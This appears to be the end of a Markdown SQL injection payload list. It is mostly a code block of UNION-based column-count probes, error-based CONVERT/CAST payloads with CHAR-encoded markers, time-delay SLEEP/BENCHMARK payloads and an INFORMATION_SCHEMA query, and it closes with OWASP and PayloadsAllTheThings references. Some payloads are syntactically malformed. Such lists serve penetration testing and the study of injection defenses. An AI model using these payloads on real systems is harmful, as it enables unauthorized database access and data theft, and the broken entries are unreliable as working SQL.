  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
  UNION ALL SELECT NULL-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
  UNION ALL SELECT NULL#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
  UNION ALL SELECT NULL 
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
  AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
  AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
  AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
  AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
  UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX'
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
  UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
  UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
```

## REFERENCIAS

- [SQL Injection ( OWASP )](https://www.owasp.org/index.php/SQL_Injection)
- [Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection)
- [Testing for SQL Injection (OTG-INPVAL-005)](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005))
- [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
- [SQL injection payloads list-payloadbox](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
- [SQL Payloadsallthings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [Enumeration INFORMATION_SCHEMA tables](https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/information-schema.html#tables-table)